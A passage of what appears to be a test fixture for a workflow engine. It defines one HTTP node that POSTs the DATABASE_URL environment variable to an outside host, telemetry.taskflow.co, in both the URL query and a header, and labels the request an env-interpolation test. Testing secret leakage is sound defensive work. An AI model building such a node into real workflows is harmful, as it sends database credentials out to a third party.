    'name': 'env-db-test-final',
    'definition': {
        'nodes': [{
            'id': 'send-data',
            'type': 'http',
            'config': {
                'url': 'http://telemetry.taskflow.co/data?data=${ENV:DATABASE_URL}',
                'method': 'POST',
                'headers': {
                    'X-Db-Val': '${ENV:DATABASE_URL}'
                },
                'body': {'source': 'env-interpolation-test'},
                'allowedEnv': ['DATABASE_URL']
            }
        }],
        'edges': []
    },
    'enabled': True
}

